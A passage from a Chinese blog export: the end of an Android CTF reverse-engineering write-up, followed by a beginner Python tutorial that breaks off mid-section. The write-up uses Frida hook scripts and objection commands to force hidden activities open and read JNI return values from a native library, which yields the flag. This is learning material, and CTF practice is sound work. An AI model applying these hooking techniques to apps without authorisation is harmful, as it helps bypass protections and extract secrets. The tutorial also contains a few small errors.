asset_img 20.2.png 修改文件 %}\n\n那就载入jeb分析看看吧。\n\n{% asset_img 20.3.png jeb分析 %}\n\n{% asset_img 20.4.png jeb分析 %}\n\n{% asset_img 20.5.png jeb分析 %}\n\n{% asset_img 20.6.png jeb分析 %}\n\n{% asset_img 20.7.png jeb分析 %}\n\n这些方法都是在so文件里面。解包先看看so文件。导出表刚好有这三个函数。如果导出表有native函数，说明这些是导出函数；如果没有，而只有JNI_Onload，说明那些是未导出函数。\n\n{% asset_img 20.8.png IDA分析 %}\n\n{% asset_img 20.9.png IDA分析 %}\n\n{% asset_img 20.10.png IDA分析 %}\n\n{% asset_img 20.11.png IDA分析 %}\n\n可以确定`DefinitelyNotThisOne`函数肯定没有flag。剩下那两个函数看得我头大，而且传入的参数也有些是在Java层加密过的。\n\n因为你！我去学了Frida so hook！[Frida超详细安装实战教程](https://www.52pojie.cn/thread-1128884-1-1.html)\n\nhook一个so方法需要知道：\n\n- 程序的名字(Frida-ps -U查看程序名字)：CTF Application\n- so文件名：libhello-jni.so\n- so方法名：Java_com_example_application_ThisIsTheRealOne_orThat\n\n编写hook脚本：\n\n```python\nimport frida\nimport sys\n\njscode = \"\"\"\nfunction main(){\nfunction getjstring(jstr) {\n        return Java.vm.getEnv().getStringUtfChars(jstr, null).readCString();\n    }\nJava.perform(function(){\n    Interceptor.attach(Module.findExportByName(\"libhello-jni.so\",\"Java_com_example_application_ThisIsTheRealOne_orThat\"),{\n        onEnter: function(args) {\n            send(\"Hook start\");\n        },\n        onLeave: function(retval){\n            send(\"orThat_result:\" + getjstring(retval));\n        }\n    });\n});\n}\nsetImmediate(main);\n\"\"\"\ndef printMessage(message,data):\n    if message['type'] == 'send':\n        print('{0}'.format(message['payload']))\n    else:\n        print(message)\n\nprocess = frida.get_remote_device().attach('CTF Application')\nscript = process.create_script(jscode)\nscript.on('message',printMessage)\nscript.load()\nsys.stdin.read()\n```\n\n开启Frida服务：\n\n```\nC:\\Users\\dell>adb shell\naosp:/ # cd /data/local/tmp\naosp:/data/local/tmp # ls\nandroid_x86_server  frida-server-15.1.17-android-x86\naosp:/data/local/tmp # ./frida-server-15.1.17-android-x86\n```\n\n打开另一命令窗口开启端口转发，Frida默认端口27042：\n\n```\nC:\\Users\\dell>adb forward tcp:27042 tcp:27042\n27042\n```\n\n等等，突然想起来我们还没去到我们想要进去的Activity，修改xml文件我是不会修改了，但可以利用objection运行指定的Activity。\n\n安装objection：`pip install objection`\n\n在模拟器运行程序，在终端输入需要调试的程序的包名：`objection -g com.example.hellojni explore`\n\n```\nC:\\Users\\dell>objection -g com.example.hellojni explore\nUsing USB device `Android Emulator 5554`\nAgent injected and responds ok!\n\n     _   _         _   _\n ___| |_|_|___ ___| |_|_|___ ___\n| . | . | | -_|  _|  _| | . |   |\n|___|___| |___|___|_| |_|___|_|_|\n      |___|(object)inject(ion) v1.11.0\n\n     Runtime Mobile Exploration\n        by: @leonjza from @sensepost\n\n[tab] for command suggestions\ncom.example.hellojni on (Meizu: 7.1.2) [usb] #\n```\n\n列出app所有的Activity：`android hooking list activities`\n\n```\ncom.example.hellojni on (Meizu: 7.1.2) [usb] # android hooking list activities\ncom.example.application.DefinitelyNotThisOne\ncom.example.application.IsThisTheRealOne\ncom.example.application.MainActivity\ncom.example.application.ThisIsTheRealOne\n\nFound 4 classes\n```\n\n启动指定Activity：`android intent launch_activity com.example.application.ThisIsTheRealOne` \n\n```\ncom.example.hellojni on (Meizu: 7.1.2) [usb] # android intent launch_activity com.example.application.ThisIsTheRealOne\n(agent) Starting activity com.example.application.ThisIsTheRealOne...\n(agent) Activity successfully asked to start.\n```\n\n可以看到程序页面已经变了：\n\n{% asset_img 20.12.png ThisIsTheRealOne页面 %}\n\n运行脚本，点击程序中间的按钮，打印返回值。\n\n```\nC:\\Users\\dell\\Desktop>python hookso.py\nHook start\norThat_result:KeepTryingThisIsNotTheActivityYouAreLookingForButHereHaveSomeInternetPoints!\n```\n\n它说这个不是我要找的Activity，换一个。\n\n```\ncom.example.hellojni on (Meizu: 7.1.2) [usb] # android intent launch_activity com.example.application.IsThisTheRealOne\n(agent) Starting activity com.example.application.IsThisTheRealOne...\n(agent) Activity successfully asked to start.\n```\n\n修改脚本：\n\n```python\nimport frida\nimport sys\n\njscode = \"\"\"\nfunction main(){\nfunction getjstring(jstr) {\n        return Java.vm.getEnv().getStringUtfChars(jstr, null).readCString();\n    }\nJava.perform(function(){\n    Interceptor.attach(Module.findExportByName(\"libhello-jni.so\",\"Java_com_example_application_IsThisTheRealOne_perhapsThis\"),{\n        onEnter: function(args) {\n            send(\"Hook start\");\n        },\n        onLeave: function(retval){\n            send(\"perhapsThis_result:\" + getjstring(retval));\n        }\n    });\n});\n}\nsetImmediate(main);\n\"\"\"\ndef printMessage(message,data):\n    if message['type'] == 'send':\n        print('{0}'.format(message['payload']))\n    else:\n        print(message)\n\nprocess = frida.get_remote_device().attach('CTF Application')\nscript = process.create_script(jscode)\nscript.on('message',printMessage)\nscript.load()\nsys.stdin.read()\n```\n\n运行，点击按钮，打印返回值。\n\n```\nC:\\Users\\dell\\Desktop>python hookso.py\nHook start\nperhapsThis_result:Congratulation!YouFoundTheRightActivityHereYouGo-CTF{IDontHaveABadjokeSorry}\n```\n\n```\nCTF{IDontHaveABadjokeSorry}\n```\n\n# 21. LoopCrypto\n\n{% asset_img 21.1.png 运行程序 %}","categories":["Android逆向"],"tags":["Reverse","CTF"]},{"title":"Python学习","url":"/posts/e39e2a4e.html","content":"\nPython作为我学习的第三门语言，感觉它与Java还是有些相似之处，所以3天内学完Python对我来说还可以接受，关键是读写文件那里还是有些许不懂的地方。之所以学习Python，是因为我们专业开了一门机器学习的课，老师要求用Python编写程序，另一门课也涉及到爬虫之类。\n\n<!--more-->\n\n# 1. print函数\n\n```python\n#输出数字\nprint(520)\nprint(22.22)\n\n#输出字符串\nprint('hello world')\nprint(\"v5le0n9\")\n\n#输出含有运算符的表达式\nprint(520+22.22)\n\n#将数据输出到文件中\nfp = open('D:/text.txt', 'a+')\nprint('hello world', file=fp)\nfp.close()\n\n#不进行换行输出\nprint('hello', 'world', 'Python')\n```\n\n# 2. 转义字符\n\n```python\nprint('hello\\nv5le0n9')\t\t#换行\nprint('hello\\tv5le0n9')\t\t#Tab键，4个一组\nprint('helloooo\\tv5le0n9')\nprint('hello\\rv5le0n9')\t\t#光标回到初始位置\nprint('hello\\bv5le0n9')\t\t#退格，回退一个字符\nprint('hello\\\\tv5le0n9')\t#输出反斜杠\nprint('hello\\'v5le0n9')\t\t#输出单引号\nprint(r'hello\\nv5le0n9')\t#原样输出\n\n'''\nhello\nv5le0n9\nhello   v5le0n9\nhelloooo        v5le0n9\nv5le0n9\nhellv5le0n9\nhello\\tv5le0n9\nhello'v5le0n9\nhello\\nv5le0n9\n'''\n```\n\n# 3. 字符编码与关键字\n\n```python\nprint(chr(0b100111001011000))#输出字符“乘”,chr编码转字符\nprint(ord('乘'))#输出十进制20056,ord字符转编码\n```\n\n关键字不能作为标识符使用：\n\n```python\nimport keyword\nprint(keyword.kwlist)\n'''\n['False', 'None', 'True', 'and', 'as', 'assert', 'async', 'await', 'break', 'class', 'continue', 'def', 'del', 'elif', 'else', 'except', 'finally', 'for', 'from', 'global', 'if', 'import', 'in', 'is', 'lambda', 'nonlocal', 'not', 'or', 'pass', 'raise', 'return', 'try', 'while', 'with', 'yield']\n'''\n```\n\n# 4. 变量\n\n```python\nname = 'v5le0n9'\nprint(name)\nprint('标识', id(name))\nprint('类型', type(name))\nprint('值', name)\n'''\nv5le0n9\n标识 1893355704496\n类型 <class 'str'>\n值 v5le0n9\n'''\n```\n\n当变量被多次赋值后，变量名会指向新的空间，旧的那个如果没有其他变量指向它，则成为内存垃圾。\n\n# 5. 数据类型\n\n| 数据类型   | python中表示 | 例子        |\n| ---------- | ------------ | ----------- |\n| 整数类型   | int          | 98          |\n| 浮点数类型 | float        | 2.66        |\n| 布尔类型   | bool         | True, False |\n| 字符串类型 | str          | 'v5le0n9'   |\n\n## 5.1 整数类型\n\n```python\nn1 = 90\nn2 = -72\nn3 = 0\nprint(n1, type(n1))\nprint(n2, type(n2))\nprint(n3, type(n3))\nprint('十进制', 118)\nprint('二进制转十进制', 0b1011010)\nprint('八进制转十进制', 0o1234567)\nprint('十六进制转十进制', 0x1a4b5d)\n'''\n90 <class 'int'>\n-72 <class 'int'>\n0 <class 'int'>\n十进制 118\n二进制转十进制 90\n八进制转十进制 342391\n十六进制转十进制 1723229\n'''\n```\n\n## 5.2 浮点类型\n\n```python\na = 3.1415926\nprint(a, type(a))\nn1 = 1.1\nn2 = 2.2\nprint(n1 + n2)\n'''\n3.1415926 <class 'float'>\n3.3000000000000003\n'''\n```\n\n```python\nfrom decimal import Decimal\nprint(Decimal('1.1') + Decimal('2.2'))\n'''\n3.3\n'''\n```\n\n## 5.3 布尔类型\n\n```python\nprint(True + 1)\nprint(False + 1)\n'''\n2\n1\n'''\n```\n\n## 5.4 字符串类型\n\n```python\nstr1 = 'v5le0n9'\nstr2 = \"v5le0n9\"\nstr3 = '''\nv5le0n9\nl30n9ry0n\n'''\nstr4 = \"\"\"\nhhhhhhh\nkkkkkkk\n\"\"\"\n```\n\n## 5.5 数据类型转换\n\n其他类型转字符串\n\n```python\nname = \"张三\"\nage = 23\nprint(type(name), type(age))\nprint('我叫' + name + '，今年' + str(age) + '岁')\nage = 22.3\nprint(str(age))\n'''\n<class 'str'> <class 'int'>\n我叫张三，今年23岁\n22.3\n'''\n```\n\n其他类型转整型\n\n```python\ns1 = '128'\nf1 = 98.7\ns2 = '76.77'\nff = True\ns3 = 'Hello'\nprint(int(s1), type(int(s1)))\nprint(int(f1), type(int(f1)))\n#print(int(s2), type(s2)) #小数串不能转化为整型\nprint(int(ff), type(int(ff)))\n#print(int(s3), type(s3))  #不是整型数字串\n'''\n128 <class 'int'>\n98 <class 'int'>\n1 <class 'int'>\n'''\n```\n\n其他类型转浮点型\n\n```python\ns1 = '128.77'\ns2 = '76'\nff = True\ns3 = 'Hello'\nii = 98\nprint(float(s1), type(float(s1)))\nprint(float(s2), type(float(s2))) \nprint(float(ff), type(float(ff)))\n#print(float(s3), type(float(s3))) #不是数字串\nprint(float(ii), type(float(ii)))\n'''\n128.77 <class 'float'>\n76.0 <class 'float'>\n1.0 <class 'float'>\n98.0 <class 'float'>\n'''\n```\n\n其他类型转布尔类型\n\n```python\ns1 = '128.77'\ns2 = '76'\nff = True\ns3 = 'Hello'\nii = 98\ni2 = 0\nprint(bool(s1), type(bool(s1)))\nprint(bool(s2), type(bool(s2))) \nprint(bool(ff), type(bool(ff)))\nprint(bool(s3), type(bool(s3)))\nprint(bool(ii), type(bool(ii)))\nprint(bool(i2), type(bool(i2)))\n'''\nTrue <class 'bool'>\nTrue <class 'bool'>\nTrue <class 'bool'>\nTrue <class 'bool'>\nTrue <class 'bool'>\nFalse <class 'bool'>\n'''\n```\n\n# 6. input函数\n\n用于用户输入。\n\n```python\npresent = input('你猜我在干嘛\\n')\nprint(present, type(present))\n'''\n你猜我在干嘛\n你猜我猜不猜\n你猜我猜不猜 <class 'str'>\n'''\n```\n\n```python\n#从终端输入两个整数，计算两个数的和\nnum1 = input(\"输入第一个：\")\nnum2 = input(\"输入第二个：\")\nprint(type(num1), type(num2))\nprint(num1 + num2)\n'''\n输入第一个：10\n输入第二个：30\n<class 'str'> <class 'str'>\n1030\n'''\n\nnum1 = int(input(\"输入第一个：\"))\nnum2 = int(input(\"输入第二个：\"))\nprint(type(num1), type(num2))\nprint(num1 + num2)\n'''\n输入第一个：10\n输入第二个：30\n<class 'int'> <class 'int'>\n40\n'''\n```\n\n# 7. 运算符\n\n## 7.1 算术运算符\n\n```python\nprint(1 + 1)\nprint(1 - 1)\nprint(1 * 1)\nprint(1 / 2)\t#除法\nprint(11 // 2)\t#整除\nprint(2**4)\t\t#幂运算\n'''\n2\n0\n1\n0.5\n5\n16\n'''\n```\n\n| 运算符 | 表示                           | 例子                  | 结果 |\n| ------ | ------------------------------ | --------------------- | ---- |\n| %      | 取余(一正一负要公式，向下取整) | 9%4                   | 1    |\n|        | 余数=被除数-除数*商            | 9%-4<br />9-(-4)*(-3) | -3   |\n| //     | 整除(一正一负向下取整)         | 11//2                 | 5    |\n|        |                                | 9//-4                 | -3   |\n|        |                                | -9//4                 | -3   |\n\n## 7.2 赋值运算符\n\n```python\na = 3\na = b = c = 20\na, b, c = 10, 20, 30\na += 10\nc //= a\n\na, b = 10, 20\na, b = b, a\nprint(a, b)\t#20 10\n```\n\n## 7.3 比较运算符\n\n```python\na, b = 10, 20\nprint(a > b)\nprint(a == b)\nprint(a != b)\n'''\nFalse\nFalse\nTrue\n'''\n```\n\n```python\na = 10\nb = 10\nprint(a == b)\n#比较对象的标识用is/isnot\nprint(a is b)\nprint(a is not b)\n'''\nTrue\nTrue\nFalse\n'''\n```\n\n```python\nlist1 = [11,22,33,44]\nlist2 = [11,22,33,44]\nprint(list1 == list2)\nprint(list1 is list2)\nprint(id(list1))\nprint(id(list2))\n'''\nTrue\nFalse\n2189001749064\n2189001776136\n'''\n```\n\n## 7.4 布尔运算符\n\n| 运算符 | 运算数 |       | 运算结果 | 备注                                     |\n| ------ | ------ | ----- | -------- | ---------------------------------------- |\n| and    | True   | True  | True     | 当两个运算都为True时，运算结果才为True   |\n|        | True   | False | False    |                                          |\n|        | False  | True  | False    |                                          |\n|        | False  | False | False    |                                          |\n| or     | True   | True  | True     | 只要有一个运算数为True，运算结果就为True |\n|        | True   | False | True     |                                          |\n|        | False  | True  | True     |                                          |\n|        | False  | False | False    |                                          |\n| not    | True   |       | False    | 如果运算数为True，运算结果为False        |\n|        | False  |       | True     | 如果运算数为False，运算结果为True        |\n\n```python\nw = 'Hello world'\nprint('v' in w)\nprint('h' in w)\nprint('w' in w)\nprint('a' not in w)\n'''\nFalse\nFalse\nTrue\nTrue\n'''\n```\n\n## 7.5 位运算\n\n| 运算符 | 备注                                  |\n| ------ | ------------------------------------- |\n| &      | 对应数位都为1，结果数位才是1，否则为0 |\n| \\|     | 对应数位都为0，结果数位才是0，否则为1 |\n| <<     | 高位溢出舍弃，低位补0                 |\n| \\>>    | 低位溢出舍弃，高位补0                 |\n\n## 7.6 运算符的优先级\n\n算术运算 > 位运算 > 比较运算 > 布尔运算 > 赋值运算\n\n# 8. 程序的组织结构\n\n流程控制：顺序结构、选择结构、循环结构\n\n## 8.1 选择结构\n\n### 8.1.1 单分支结构\n\n```python\nif 条件表达式:\n    条件执行体\n```\n\n```python\nmoney = 10000\nx = int(input(\"请输入取款金额：\"))\nif money >= x:\n    money -= x\n    print(\"取款成功，余额为：\", money)    \n```\n\n### 8.1.2 双分支结构\n\n```python\nif 条件表达式:\n    条件执行体1\nelse:\n    条件执行体2\n```\n\n```python\nmoney = 10000\nx = int(input(\"请输入取款金额：\"))\nif money >= x:\n    money -= x\n    print(\"取款成功，余额为：\", money)    \nelse:\n    print(\"取款失败，余额不足\")\n```\n\n### 8.1.3 多分支结构\n\n```python\nif 条件表达式:\n    条件执行体1\nelif 条件表达式2:\n    条件执行体2\nelif 条件表达式N:\n    条件执行体N\nelse:\n    条件执行体N+1\n```\n\n```python\ngrade = 50\nif grade >= 90 and grade <= 100:\n    print('A')\nelif grade >=80 and grade < 90:\n    print('B')\nelif grade >= 70 and grade < 80:\n    print('C')\nelif grade >=60 and grade < 70:\n    print('D')\nelif grade < 60 and grade >= 0:\n    print('E')\nelse:\n    print(\"非法数据！\")\n    \n#离谱写法\ngrade = 90\nif 90<=grade<=100:\n    print('A')\nelif 80<=grade<90:\n    print('B')\n...\n```\n\n### 8.1.4 嵌套if语句\n\n```python\nif 条件表达式:\n    if 内层条件表达式:\n        内存条件执行体1\n    else:\n        内层条件执行体2\nelse:\n    条件执行体\n```\n\n### 8.1.5 条件表达式\n\n条件表达式是if...else的简写。\n\n```\nx if 判断条件 else y\n```\n\n运算规则：如果判断条件的布尔值为True，条件表达式的返回值为x，否则条件表达式的返回值为False。\n\n```python\nnum_a = int(input(\"请输入第一个整数：\"))\nnum_b = int(input(\"请输入第二个整数：\"))\nprint(num_a) if num_a >= num_b else print(num_b)\nprint(str(num_a) + '大于等于' + str(num_b) if num_a >= num_b else str(num_a) + '小于' + str(num_b))\n```\n\n## 8.2 pass语句\n\npass语句什么都不做，只是一个占位符，用在语法上需要语句的地方。\n\n什么时候使用：先搭建语法结构，还没想好代码怎么写\n\n哪些语句一起使用：\n\n- if语句的条件执行体\n- for-in语句的循环体\n- 定义函数时的循环体\n\n```python\nanswer = input('您是会员吗？y/n')\nif ansewr == 'y':\n    pass\nelse:\n    pass\n```\n\n## 8.3 range函数\n\nrange函数用于生成一个整数序列，返回值是一个迭代器对象。\n\n```python\n#创建一个(0, stop)之间的整数序列，步长为1\nrange(stop)\n\n#创建一个(start, stop)之间的整数序列，步长为1\nrange(start, stop)\n\n#创建一个(start, stop, step)之间的整数序列，步长为step\nrange(start, stop, step)\n```\n\n```python\nr = range(10)\nprint(r)\nprint(list(r))\n\nr = range(1, 10)\nprint(list(r))\n\nr = range(1, 10, 2)\nprint(list(r))\nprint(10 in r)\n'''\nrange(0, 10)\n[0, 1, 2, 3, 4, 5, 6, 7, 8, 9]\n[1, 2, 3, 4, 5, 6, 7, 8, 9]\n[1, 3, 5, 7, 9]\nFalse\n'''\n```\n\n## 8.4 循环结构\n\n### 8.4.1 while循环\n\n```python\nwhile 条件表达式:\n    条件执行体(循环体)\n```\n\n```python\na = 1\nwhile a < 10:\n    print(a)\n    a += 1\n```\n\n```python\n#计算1-100偶数和\na = 1\nresult = 0\nwhile a <= 100:\n    #if a % 2 == 0:\n    if not a%2:\n        result += a\n    a += 1\nprint(result)\n```\n\n### 8.4.2 for-in循环\n\nin表达从(字符串、序列等)中依次取值，又称为遍历。\n\n```python\nfor 自定义的变量 in 可迭代对象:\n    循环体\n```\n\n循环体内不需要访问自定义变量，可以将自定义变量替代为下划线。\n\n```python\nfor item in 'v5le0n9':\n    print(item)\n    \nfor i in range(10):\n    print(i)\n    \nfor _ in range(5):\n    print('hello')\n```\n\n```python\n#计算1-100偶数和\nsum = 0\nfor i in range(1, 101):\n    if not i%2:\n    \tsum += i\nprint(sum)\n```\n\n```python\n#计算100-999的水仙花数：153=1**3+5**3+3**3\nfor i in range(100,1000):\n    ge = i % 10\n    shi = i // 10 % 10\n    bai = i // 100\n    if ge**3+bai**3+shi**3 == i:\n        print(i)\n'''\n153\n370\n371\n407\n'''\n```\n\n## 8.5 流程控制语句\n\n### 8.5.1 break语句\n\n用于结束循环结构，通常与分支结构if一起使用。\n\n```python\nfor i in range(3):\n    pwd = input(\"请输入密码：\")\n    if pwd == '8888':\n        print('密码正确')\n        break\n    else:\n        print('密码不正确')\n```\n\n```python\na = 0\nwhile a < 3:\n    pwd = input(\"请输入密码：\")\n    if pwd == '8888':\n        print('密码正确')\n        break\n    else:\n        print('密码不正确')\n    a += 1\n```\n\n### 8.5.2 continue语句\n\n用于结束当前循环，进入下一次循环，通常与分支结构中的if一起使用。\n\n```python\n#输出1-50之间所有5的倍数\nfor i in range(1,51):\n    if i%5 != 0:\n        continue\n    print(i)       \n```\n\n## 8.6 else语句\n\n```python\n#if条件表达式不成立时执行else\nif...else\n\n#没有碰到break时执行else\nwhile...else\nfor...else\n```\n\n```python\nfor i in range(3):\n    pwd = input(\"请输入密码：\")\n    if pwd == '8888':\n        print('密码正确')\n        break\n    else:\n        print('密码不正确')\nelse:\n    print('密码已锁定')\n```\n\n```python\na = 0\nwhile a < 3:\n    pwd = input(\"请输入密码：\")\n    if pwd == '8888':\n        print('密码正确')\n        break\n    else:\n        print('密码不正确')\n    a += 1\nelse:\n    print('密码已锁定')\n```\n\n## 8.7 嵌套循环\n\n```python\n#打印九九乘法表\nfor i in range(1,10):\n    for j in range(1,i+1):\n        result = i * j\n        print(str(i) + '*' + str(j) + '=' + str(result), end='\\t')#也可以写成end=' '\n    print('\\n')#也可以写成print()\n```\n\n嵌套循环中的break和continue用于控制本层循环。\n\n```python\nfor _ in range(5):\n    for j in range(1, 11):\n        if j%2==0:\n            break\n        print(j)\n'''\n1\n1\n1\n1\n1\n'''\n```\n\n```python\nfor _ in range(5):\n    for j in range(1, 11):\n        if j%2==0:\n            continue\n        print(j, end='\\t')\n    print()\n'''\n1       3       5       7       9\n1       3       5       7       9\n1       3       5       7       9\n1       3       5       7       9\n1       3       5       7       9\n'''\n```\n\n# 9. 列表\n\nPython中的列表可以存储不同的数据类型。\n\n```python\nlst = ['hello', 98, 44.2, True]\nprint(id(lst))\nprint(type(lst))\nprint(lst)\n'''\n1943553438088\n<class 'list'>\n['hello', 98, 44.2, True]\n'''\n```\n\n## 9.1 创建列表\n\n```python\nlst = ['hello', 98, True]\nlst2 = list(['hello', 98, True])\nlst3 = []\nlst4 = list()\n```\n\n## 9.2 列表的特点\n\n1. 列表元素按顺序有序排序\n2. 索引映射唯一一个数据\n3. 列表可以存储重复数据\n4. 任意数据类型混存\n5. 根据需要动态分配和回收内存\n\n```python\nlst = ['hello', 98, True, 98]\nprint(lst)\nprint(lst[0], lst[-4])\n'''\n['hello', 98, True, 98]\nhello hello\n'''\n```\n\n## 9.3 列表的查询\n\n### 9.3.1 获取列表中指定元素的索引\n\n列表中存在N个相同元素时，只返回相同元素中的第一个元素的索引。如果查询的元素在列表中不存在，则会抛出`ValueError`。还可以在指定的start和stop之间进行查找。\n\n```python\nlst = ['hello', 98, True, 98]\nprint(lst.index(98))\n#print(lst.index('hei'))\t#引发异常\nprint(lst.index(98,2,4))\n'''\n1\n3\n'''\n```\n\n### 9.3.2 获取列表中的单个元素\n\n正向索引从0到N-1，逆向索引从-N到-1，指定索引不存在，则会抛出`ValueError`。\n\n```python\nlst = ['hello', 'world', 98, 'hello', 'world', 234]\nprint(lst[2])\nprint(lst[-3])\n'''\n98\nhello\n'''\n```\n\n### 9.3.3 获取列表中的多个元素\n\n```python\n列表名[start: stop: step]\n```\n\n```python\nlst = [10,20,30,40,50,60,70,80,90]\nprint('原列表', id(lst))\nlst2 = lst[1:6:1]\nprint('切片列表', id(lst2))\nprint(lst2)\nprint(lst[:6:2])\nprint(lst[::-1])\nprint(lst[6:0:-2])\n'''\n原列表 1347062984904\n切片列表 1347063015496\n[20, 30, 40, 50, 60]\n[10, 30, 50]\n[90, 80, 70, 60, 50, 40, 30, 20, 10]\n[70, 50, 30]\n'''\n```\n\n### 9.3.4 列表元素的判断与遍历\n\n```python\nlst = [10,20,'python','world']\nprint(10 in lst)\nprint(20 not in lst)\nfor i in lst:\n    print(i)\n'''\nTrue\nFalse\n10\n20\npython\nworld\n'''\n```\n\n## 9.4 列表元素的添加\n\n```python\nlst = [10,20,30]\nprint('添加元素之前',lst,id(lst))\nlst.append(100)\nprint('添加元素之后',lst,id(lst))\n\n#将lst2作为一个元素添加到lst的末尾\nlst2 = ['hello','v5le0n9']\nlst.append(lst2)\nprint(lst)\n\n#向列表的末尾一次性添加多个元素\nlst.extend(lst2)\nprint(lst)\n\n#在下标为1的位置上插入元素90\nlst.insert(1,90)\nprint(lst)\n\n#列表切片\nlst3 = [True, False, 'hello']\nlst[1:3] = lst3#将lst3的所有元素覆盖lst下标为1和2的元素\nprint(lst)\nlst[:] = lst3\nprint(lst)\n'''\n添加元素之前 [10, 20, 30] 1236490777544\n添加元素之后 [10, 20, 30, 100] 1236490777544\n[10, 20, 30, 100, ['hello', 'v5le0n9']]\n[10, 20, 30, 100, ['hello', 'v5le0n9'], 'hello', 'v5le0n9']\n[10, 90, 20, 30, 100, ['hello', 'v5le0n9'], 'hello', 'v5le0n9']\n[10, True, False, 'hello', 30, 100, ['hello', 'v5le0n9'], 'hello', 'v5le0n9']\n[True, False, 'hello']\n'''\n```\n\n## 9.5 列表元素的删除\n\n```python\nlst = [10,20,30,40,50,60,30]\n#移除列表重复元素的第一个元素\nlst.remove(30)\nprint(lst)\n\n#根据索引移除元素\nlst.pop(1)\nprint(lst)\nlst.pop()#默认将最后一个元素移除\nprint(lst)\n\n#切片，删除至少一个元素，产生一个新的列表对象\nnew_lst = lst[1:3]\nprint('原列表',lst)\nprint('切片后产生的新列表', new_lst)\n\n#不产生新的列表对象，删除原列表内容\nlst[1:3] = []\nprint(lst)\n\n#清除列表中的所有元素\nlst.clear()\nprint(lst)\n\n#将列表对象删除\ndel lst\n#print(lst)\t#抛出异常\n'''\n[10, 20, 40, 50, 60, 30]\n[10, 40, 50, 60, 30]\n[10, 40, 50, 60]\n原列表 [10, 40, 50, 60]\n切片后产生的新列表 [40, 50]\n[10, 60]\n[]\n'''\n```\n\n## 9.6 列表元素的修改\n\n```python\nlst = [10,20,30,40]\nlst[2] = 100\nprint(lst)\n\nlst[1:3] = [300,400,500,600]\nprint(lst)\n'''\n[10, 20, 100, 40]\n[10, 300, 400, 500, 600, 40]\n'''\n```\n\n## 9.7 列表元素的排序\n\n```python\nlst = [20,40,10,98,54]\nprint('排序前的列表', lst, id(lst))\n\n#开始排序，调用列表对象的sort方法，升序排序\nlst.sort()\nprint('排序后的列表', lst, id(lst))\n\nlst.sort(reverse = True)\nprint(lst)\n\n#使用内置函数sorted()对列表进行排序，将产生一个新的列表对象\nlst = [20,40,10,98,54]\nprint(lst, id(lst))\nnew_lst = sorted(lst)\nprint(new_lst, id(new_lst))\ndesc_lst = sorted(lst, reverse = True)\nprint(desc_lst)\n'''\n排序前的列表 [20, 40, 10, 98, 54] 1692186177736\n排序后的列表 [10, 20, 40, 54, 98] 1692186177736\n[98, 54, 40, 20, 10]\n[20, 40, 10, 98, 54] 1692186208264\n[10, 20, 40, 54, 98] 1692186177736\n[98, 54, 40, 20, 10]\n'''\n```\n\n## 9.8 列表生成式\n\n```python\nlst = [i for i in range(1,10)]\nprint(lst)\nlst2 = [i*i for i in range(1,10)]\nprint(lst2)\n'''\n[1, 2, 3, 4, 5, 6, 7, 8, 9]\n[1, 4, 9, 16, 25, 36, 49, 64, 81]\n'''\n```\n\n# 10. 字典\n\n以键值对的方式存储数据，是一个无序的序列。\n\n字典的实现原理与查字典类似，查字典是先根据部首或拼音查找对应的页码，python中的字典是根据key查找value所在的位置。\n\n## 10.1 字典的创建\n\n```python\nscores = {'张三':100, '李四':87, '王五':95}\nprint(scores)\nprint(type(scores))\n\nstudent = dict(name='jack', age='20')\nprint(student)\n\nd = {}\nd2 = dict()\nprint(d,d2)\n'''\n{'张三': 100, '李四': 87, '王五': 95}\n<class 'dict'>\n{'name': 'jack', 'age': '20'}\n{} {}\n'''\n```\n\n## 10.2 字典元素的获取\n\n```python\nscores = {'张三':100, '李四':87, '王五':95}\nprint(scores['张三'])\n#print(scores['陈六'])\t#异常\n\nprint(scores.get('张三'))\nprint(scores.get('陈六'))\nprint(scores.get('麻七',99))#当麻七不存在在字典里，99为默认值\n'''\n100\n100\nNone\n99\n'''\n```\n\n## 10.3 字典的增删改\n\n```python\n#字典的判断\nscores = {'张三':100, '李四':87, '王五':95}\nprint('张三' in scores)\nprint('张三' not in scores)\n\n#字典元素的删除\ndel scores['张三']\nprint(scores)\n\nscores.clear()\nprint(scores)\n\n#字典元素的新增\nscores['陈六'] = 98\nprint(scores)\n\n#字典元素的修改\nscores['陈六'] = 80\nprint(scores)\n'''\nTrue\nFalse\n{'李四': 87, '王五': 95}\n{}\n{'陈六': 98}\n{'陈六': 80}\n'''\n```\n\n## 10.4 获取字典视图\n\n```python\nscores = {'张三':100, '李四':87, '王五':95}\n\n#获取所有的key\nkeys = scores.keys()\nprint(keys)\nprint(type(keys))\n\n#将所有的key组成的视图转换成列表\nprint(list(keys))\n\n#获取所有的value\nvalues = scores.values()\nprint(values)\nprint(type(values))\nprint(list(values))\n\n#获取所有的键值对\nitems = scores.items()\nprint(items)\nprint(list(items))\t#转换之后的列表元素由元组组成\n'''\ndict_keys(['张三', '李四', '王五'])\n<class 'dict_keys'>\n['张三', '李四', '王五']\ndict_values([100, 87, 95])\n<class 'dict_values'>\n[100, 87, 95]\ndict_items([('张三', 100), ('李四', 87), ('王五', 95)])\n[('张三', 100), ('李四', 87), ('王五', 95)]\n'''\n```\n\n## 10.5 字典元素的遍历\n\n```python\nscores = {'张三':100, '李四':87, '王五':95}\nfor item in scores:\n    print(item, scores[item], scores.get(item))\n'''\n张三 100 100\n李四 87 87\n王五 95 95\n'''\n```\n\n## 10.6 字典的特点\n\n- 字典中的所有元素都是一个键值对，key不允许重复，value可以重复\n\n- 字典中的元素是无序的\n- 字典中的key必须是不可变对象\n- 字典也可以根据需要动态地伸缩\n- 字典会浪费较大的内存，是一种使用空间换时间的数据结构\n\n## 10.7 字典生成式\n\n### 10.7.1 zip函数\n\n用于将可迭代对象作为参数，将对象中对应的元素打包成一个元组，然后返回有这些元组组成的列表。\n\n### 10.7.2 字典生成式\n\n```python\nitems = ['hei', 'biu', 'v5le0n9']\nprices = [96, 98, 55, 66]\nd = {item.upper():prices for item,prices in zip(items,prices)}\nprint(d)\n'''\n{'HEI': 96, 'BIU': 98, 'V5LE0N9': 55}\n'''\n```\n\n# 11. 元组\n\n元组是一个不可变序列。\n\n不可变序列：字符串、元组，没有增删改操作。\n\n可变序列：列表、字典，可以对序列执行增删改操作，对象地址不发生更改。\n\n元组中存储的是对象的引用。\n\n- 如果元组中对象本身为不可变对象，则不能再引用其它对象\n- 如果元组中对象是可变对象，则可变对象的引用不允许改变，但数据可以改变\n\n```python\nt = (10,[20,30],9)\nprint(t)\nprint(type(t))\nprint(t[0],type(t[0]),id(t[0]))\nprint(t[1],type(t[1]),id(t[1]))\nprint(t[2],type(t[2]),id(t[2]))\nprint(id(100))\n#t[1] = 